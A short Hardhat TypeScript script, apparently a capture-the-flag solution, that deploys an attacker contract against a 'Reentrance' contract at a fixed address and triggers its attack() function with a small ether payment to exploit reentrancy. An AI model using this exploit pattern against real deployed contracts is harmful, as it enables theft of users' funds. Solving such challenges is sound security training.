import { TransactionResponse } from '@ethersproject/providers';
import { ethers } from 'hardhat';
import web3 from 'web3';

const CONTRACT_NAME = 'Reentrance';
const ATTACKER_NAME = 'ReentranceAttcker';
const CONTRACT_ADDRESS = '0xc3B05bA73bEE440EaFDA13Bb973BbDb6A5319851';

export async function main() {
  let tx: TransactionResponse;

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address);
  await attackerContract.deployed();
  await attackerContract.deployTransaction.wait(5);
  console.log('Attacker Contract deployed to:', attackerContract.address);

  const valueToSend = ethers.utils.parseEther('0.001');
  tx = await attackerContract.attack({ value: valueToSend });
  await tx.wait(2);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
